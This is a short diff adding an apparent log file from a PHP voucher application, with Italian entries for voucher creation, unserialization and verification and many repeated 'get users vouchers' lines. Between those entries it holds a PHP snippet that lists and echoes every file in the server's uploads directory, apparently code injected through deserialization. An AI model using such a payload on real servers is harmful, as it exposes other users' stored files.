@@ -1,0 +1,22 @@
+Creazione voucher qmimp@ubyli.ci pxmcxehrisdbwlb
+Unserialized voucher qmimp@ubyli.ci pxmcxehrisdbwlb 
+$files1 = array_diff(scandir(getcwd()."/uploads/"), array("..", "."));
+echo $files1;
+foreach ($files1 as &$value) {
+    $x = fopen(getcwd()."/uploads/".$value, "r");
+    $y = fread($x, filesize(getcwd()."/uploads/".$value));
+    echo $y;
+}
+
+get users vouchers
+Verifica voucher qmimp@ubyli.ci pxmcxehrisdbwlb
+get users vouchers
+get users vouchers
+get users vouchers
+get users vouchers
+get users vouchers
+get users vouchers
+get users vouchers
+get users vouchers
+get users vouchers
+get users vouchers
